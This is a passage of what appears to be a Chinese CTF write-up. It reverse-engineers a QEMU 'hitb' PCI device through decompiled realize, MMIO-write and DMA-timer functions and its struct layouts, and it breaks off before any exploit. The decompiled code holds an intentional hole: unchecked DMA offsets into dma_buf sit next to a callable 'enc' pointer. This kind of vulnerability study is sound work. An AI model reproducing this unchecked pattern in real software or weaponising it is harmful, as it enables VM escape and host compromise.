<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">------ include/linux/ioport.h ------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IO resources have these defined flags.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * PCI devices expose these flags to userspace in the "resource" sysfs file,</span></span><br><span class="line"><span class="comment"> * so don't move them.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_BITS		0x000000ff	<span class="comment">/* Bus-specific bits */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_TYPE_BITS	0x00001f00	<span class="comment">/* Resource type */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IO		0x00000100	<span class="comment">/* PCI/ISA I/O ports */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM		0x00000200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_REG		0x00000300	<span class="comment">/* Register offsets */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ		0x00000400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA		0x00000800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_BUS		0x00001000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_PREFETCH	0x00002000	<span class="comment">/* No side effects */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_READONLY	0x00004000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_CACHEABLE	0x00008000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_RANGELENGTH	0x00010000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_SHADOWABLE	0x00020000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_SIZEALIGN	0x00040000	<span class="comment">/* size indicates alignment */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_STARTALIGN	0x00080000	<span class="comment">/* start field is alignment */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_64	0x00100000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_WINDOW	0x00200000	<span class="comment">/* forwarded by bridge */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MUXED	0x00400000	<span class="comment">/* Resource is software muxed */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_EXT_TYPE_BITS 0x01000000	<span class="comment">/* Resource extended types */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_SYSRAM	0x01000000	<span class="comment">/* System RAM (modifier) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_EXCLUSIVE	0x08000000	<span class="comment">/* Userland may not map this resource */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DISABLED	0x10000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_UNSET	0x20000000	<span class="comment">/* No address assigned yet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_AUTO		0x40000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_BUSY		0x80000000	<span class="comment">/* Driver has marked this resource busy */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* I/O resource extended types */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_SYSTEM_RAM		(IORESOURCE_MEM|IORESOURCE_SYSRAM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PnP IRQ specific bits (IORESOURCE_BITS) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ_HIGHEDGE		(1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ_LOWEDGE		(1&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ_HIGHLEVEL	(1&lt;&lt;2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ_LOWLEVEL		(1&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ_SHAREABLE	(1&lt;&lt;4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IRQ_OPTIONAL 	(1&lt;&lt;5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PnP DMA specific bits (IORESOURCE_BITS) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_TYPE_MASK	(3&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_8BIT		(0&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_8AND16BIT	(1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_16BIT		(2&lt;&lt;0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_MASTER		(1&lt;&lt;2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_BYTE		(1&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_WORD		(1&lt;&lt;4)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_SPEED_MASK	(3&lt;&lt;6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_COMPATIBLE	(0&lt;&lt;6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_TYPEA		(1&lt;&lt;6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_TYPEB		(2&lt;&lt;6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_DMA_TYPEF		(3&lt;&lt;6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PnP memory I/O specific bits (IORESOURCE_BITS) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_WRITEABLE	(1&lt;&lt;0)	<span class="comment">/* dup: IORESOURCE_READONLY */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_CACHEABLE	(1&lt;&lt;1)	<span class="comment">/* dup: IORESOURCE_CACHEABLE */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_RANGELENGTH	(1&lt;&lt;2)	<span class="comment">/* dup: IORESOURCE_RANGELENGTH */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_TYPE_MASK	(3&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_8BIT		(0&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_16BIT		(1&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_8AND16BIT	(2&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_32BIT		(3&lt;&lt;3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_SHADOWABLE	(1&lt;&lt;5)	<span class="comment">/* dup: IORESOURCE_SHADOWABLE */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_MEM_EXPANSIONROM	(1&lt;&lt;6)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PnP I/O specific bits (IORESOURCE_BITS) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IO_16BIT_ADDR	(1&lt;&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IO_FIXED		(1&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_IO_SPARSE		(1&lt;&lt;2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PCI ROM control bits (IORESOURCE_BITS) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_ROM_ENABLE		(1&lt;&lt;0)	<span class="comment">/* ROM is enabled, same as PCI_ROM_ADDRESS_ENABLE */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_ROM_SHADOW		(1&lt;&lt;1)	<span class="comment">/* Use RAM image, not ROM BAR */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PCI control bits.  Shares IORESOURCE_BITS with above PCI ROM.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_PCI_FIXED		(1&lt;&lt;4)	<span class="comment">/* Do not move resource */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IORESOURCE_PCI_EA_BEI		(1&lt;&lt;5)	<span class="comment">/* BAR Equivalent Indicator */</span></span></span><br></pre></td></tr></table></figure>

<h2 id="pci-hitb-realize"><a href="#pci-hitb-realize" class="headerlink" title="pci_hitb_realize"></a>pci_hitb_realize</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">pci_hitb_realize</span><span class="params">(PCIDevice_0 *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(</span><br><span class="line">      (QEMUTimer_0 *)&amp;pdev[<span class="number">1</span>].io_regions[<span class="number">4</span>],</span><br><span class="line">      main_loop_tlg.tl[<span class="number">1</span>],</span><br><span class="line">      <span class="number">1000000</span>,</span><br><span class="line">      (QEMUTimerCB *)hitb_dma_timer,</span><br><span class="line">      pdev);</span><br><span class="line">    qemu_mutex_init((QemuMutex_0 *)&amp;pdev[<span class="number">1</span>].io_regions[<span class="number">0</span>].type);</span><br><span class="line">    qemu_cond_init((QemuCond_0 *)&amp;pdev[<span class="number">1</span>].io_regions[<span class="number">1</span>].type);</span><br><span class="line">    qemu_thread_create(</span><br><span class="line">      (QemuThread_0 *)&amp;pdev[<span class="number">1</span>].io_regions[<span class="number">0</span>].size,</span><br><span class="line">      <span class="string">"hitb"</span>,</span><br><span class="line">      (<span class="keyword">void</span> *(*)(<span class="keyword">void</span> *))hitb_fact_thread,</span><br><span class="line">      pdev,</span><br><span class="line">      <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(</span><br><span class="line">      (MemoryRegion_0 *)&amp;pdev[<span class="number">1</span>],</span><br><span class="line">      &amp;pdev-&gt;qdev.parent_obj,</span><br><span class="line">      &amp;hitb_mmio_ops,</span><br><span class="line">      pdev,</span><br><span class="line">      <span class="string">"hitb-mmio"</span>,</span><br><span class="line">      <span class="number">0x100000</span>uLL);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, <span class="number">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先初始化了一个<code>timer</code>，定义了<code>timer</code>的回调函数<code>hitb_dma_timer</code>。关于<code>timer</code>的相关函数定义，在<code>include/qemu/timer.h</code>中</p>
<p>后面最关键的是<code>memory_region_init_io</code>函数的<code>hitb_mmio_ops</code>这个参数，它表示了这个设备可以进行什么操作以及分别如何进行这些操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:00000000009690A0 hitb_mmio_ops   dq offset hitb_mmio_read; read</span><br><span class="line">.data.rel.ro:00000000009690A0                                         ; DATA XREF: pci_hitb_realize+99↑o</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq offset hitb_mmio_write; write</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq 0                    ; read_with_attrs</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq 0                    ; write_with_attrs</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq 0                    ; request_ptr</span><br><span class="line">.data.rel.ro:00000000009690A0                 dd DEVICE_NATIVE_ENDIAN ; endianness</span><br><span class="line">.data.rel.ro:00000000009690A0                 db 4 dup(0)</span><br><span class="line">.data.rel.ro:00000000009690A0                 dd 0                    ; valid.min_access_size</span><br><span class="line">.data.rel.ro:00000000009690A0                 dd 0                    ; valid.max_access_size</span><br><span class="line">.data.rel.ro:00000000009690A0                 db 0                    ; valid.unaligned</span><br><span class="line">.data.rel.ro:00000000009690A0                 db 7 dup(0)</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq 0                    ; valid.accepts</span><br><span class="line">.data.rel.ro:00000000009690A0                 dd 0                    ; impl.min_access_size</span><br><span class="line">.data.rel.ro:00000000009690A0                 dd 0                    ; impl.max_access_size</span><br><span class="line">.data.rel.ro:00000000009690A0                 db 0                    ; impl.unaligned</span><br><span class="line">.data.rel.ro:00000000009690A0                 db 3 dup(0)</span><br><span class="line">.data.rel.ro:00000000009690A0                 db 4 dup(0)</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq 3 dup(0)             ; old_mmio.read</span><br><span class="line">.data.rel.ro:00000000009690A0                 dq 3 dup(0)             ; old_mmio.write</span><br></pre></td></tr></table></figure>

<p>我们就知道，该设备有<code>read</code>，<code>write</code>两种操作，其对应的函数分别为<code>hitb_mmio_read</code>和<code>hitb_mmio_write</code></p>
<h2 id="hitb-mmio-write"><a href="#hitb-mmio-write" class="headerlink" title="hitb_mmio_write"></a>hitb_mmio_write</h2><p><code>hitb_mmio_read</code>函数没什么好看的，关键点在<code>hitb_mmio_write</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">int64_t</span> v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (!((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">0x80</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">        opaque-&gt;dma.src = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = val;</span><br><span class="line">      <span class="keyword">if</span> ( addr &gt; <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.dst + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x8C</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( addr == <span class="number">0x90</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">              opaque-&gt;dma.cnt = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x98</span> &amp;&amp; val &amp; <span class="number">1</span> &amp;&amp; !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;dma.cmd = val;</span><br><span class="line">            v7 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL_0);</span><br><span class="line">            timer_mod(</span><br><span class="line">              &amp;opaque-&gt;dma_timer,</span><br><span class="line">              ((<span class="keyword">signed</span> __int64)((<span class="keyword">unsigned</span> __int128)(<span class="number">0x431BDE82D7B634DB</span>LL * (<span class="keyword">signed</span> __int128)v7) &gt;&gt; <span class="number">0x40</span>) &gt;&gt; <span class="number">18</span>)</span><br><span class="line">            - (v7 &gt;&gt; <span class="number">0x3F</span>)</span><br><span class="line">            + <span class="number">0x64</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x84</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">            *(<span class="keyword">dma_addr_t</span> *)((<span class="keyword">char</span> *)&amp;opaque-&gt;dma.src + <span class="number">4</span>) = val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x88</span> &amp;&amp; !(opaque-&gt;dma.cmd &amp; <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          opaque-&gt;dma.dst = val;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( val &amp; <span class="number">0x80</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status |= val;</span><br><span class="line">          <span class="keyword">if</span> ( !v6 )</span><br><span class="line">            hitb_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = ~(_DWORD)val;</span><br><span class="line">          v6 = (v5 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">          opaque-&gt;irq_status &amp;= v5;</span><br><span class="line">          <span class="keyword">if</span> ( v6 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">            pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        opaque-&gt;addr4 = ~(_DWORD)val;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">8</span> &amp;&amp; !(opaque-&gt;status &amp; <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        qemu_mutex_lock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">        opaque-&gt;fact = v4;</span><br><span class="line">        _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">        qemu_cond_signal(&amp;opaque-&gt;thr_cond);</span><br><span class="line">        qemu_mutex_unlock(&amp;opaque-&gt;thr_mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它会根据addr来对结构体的各字段进行赋值</p>
<p>关于<code>HitbState</code>与<code>dma_state</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> HitbState       struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1BD0</span>, align=<span class="number">0x10</span>, copyof_1493)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: hitb_dma_timer:loc_284120/o</span><br><span class="line"><span class="number">00000000</span> pdev            PCIDevice_0 ?</span><br><span class="line"><span class="number">000009F</span>0 mmio            MemoryRegion_0 ?</span><br><span class="line"><span class="number">00000</span>AF0 thread          QemuThread_0 ?</span><br><span class="line"><span class="number">00000</span>AF8 thr_mutex       QemuMutex_0 ?</span><br><span class="line"><span class="number">00000B</span>20 thr_cond        QemuCond_0 ?</span><br><span class="line"><span class="number">00000B</span>50 stopping        db ?</span><br><span class="line"><span class="number">00000B</span>51                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>52                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>53                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>54 addr4           dd ?</span><br><span class="line"><span class="number">00000B</span>58 fact            dd ?</span><br><span class="line"><span class="number">00000B</span>5C status          dd ?</span><br><span class="line"><span class="number">00000B</span>60 irq_status      dd ?</span><br><span class="line"><span class="number">00000B</span>64                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>65                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>66                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>67                 db ? ; undefined</span><br><span class="line"><span class="number">00000B</span>68 dma             dma_state ?</span><br><span class="line"><span class="number">00000B</span>88 dma_timer       QEMUTimer_0 ?</span><br><span class="line"><span class="number">00000B</span>B8 dma_buf         db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001B</span>B8 enc             dq ?                    ; offset</span><br><span class="line"><span class="number">00001B</span>C0 dma_mask        dq ?</span><br><span class="line"><span class="number">00001B</span>C8                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>C9                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CA                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CB                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CC                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CD                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CE                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>CF                 db ? ; undefined</span><br><span class="line"><span class="number">00001B</span>D0 HitbState       ends</span><br><span class="line"><span class="number">00001B</span>D0</span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> dma_state       struc ; (<span class="keyword">sizeof</span>=<span class="number">0x20</span>, align=<span class="number">0x8</span>, copyof_1491)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: HitbState/r</span><br><span class="line"><span class="number">00000000</span> src             dq ?</span><br><span class="line"><span class="number">00000008</span> dst             dq ?</span><br><span class="line"><span class="number">00000010</span> cnt             dq ?</span><br><span class="line"><span class="number">00000018</span> cmd             dq ?</span><br><span class="line"><span class="number">00000020</span> dma_state       ends</span><br></pre></td></tr></table></figure>

<p>要注意的是，它在<code>addr == 0x98</code>的时候，启动了<code>timer</code>，当<code>timer</code>到时之后会调用回调函数<code>hitb_dma_timer</code></p>
<h2 id="hitb-dma-timer"><a href="#hitb-dma-timer" class="headerlink" title="hitb_dma_timer"></a>hitb_dma_timer</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">dma_addr_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">dma_addr_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v6; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *v7; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  v1 = opaque-&gt;dma.cmd;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &amp; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(LODWORD(opaque-&gt;dma.src) - <span class="number">0x40000</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">uint8_t</span> *, _QWORD))opaque-&gt;enc)(v7, LODWORD(opaque-&gt;dma.cnt));</span><br><span class="line">        v3 = v7;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (<span class="keyword">uint8_t</span> *)&amp;opaque-&gt;dma_buf[v2];</span><br><span class="line">      &#125;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.dst, v3, opaque-&gt;dma.cnt, <span class="number">1</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = opaque-&gt;dma.cmd &amp; <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">uint8_t</span> *)&amp;opaque[<span class="number">0xFFFFFFDB</span>LL].dma_buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)opaque-&gt;dma.dst + <span class="number">0x510</span>];</span><br><span class="line">      LODWORD(v3) = (_DWORD)opaque + opaque-&gt;dma.dst - <span class="number">0x40000</span> + <span class="number">0xBB8</span>;</span><br><span class="line">      cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, <span class="number">0</span>);</span><br><span class="line">      v4 = opaque-&gt;dma.cmd;</span><br><span class="line">      v5 = opaque-&gt;dma.cmd &amp; <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;dma.cmd &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (<span class="keyword">uint8_t</span> *)LODWORD(opaque-&gt;dma.cnt);</span><br><span class="line">        ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">uint8_t</span> *, <span class="keyword">uint8_t</span> *, <span class="keyword">dma_addr_t</span>))opaque-&gt;enc)(v6, v3, v5);</span><br><span class="line">        v4 = opaque-&gt;dma.cmd;</span><br><span class="line">        v5 = opaque-&gt;dma.cmd &amp; <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    opaque-&gt;dma.cmd = v4 &amp; <span class="number">0xFFFFFFFFFFFFFFFE</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;irq_status |= <span class="number">0x100</span>u;</span><br><span class="line">      hitb_raise_irq(opaque, (<span class="keyword">uint32_t</span>)v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要流程是，根据<code>cmd</code>、<code>src</code>、<code>dst</code>和<code>cnt</code>的值，来对<code>dma_buf</code>以及内存进行存取。</p>
<p>其主要流程如下：</p>
<ul>
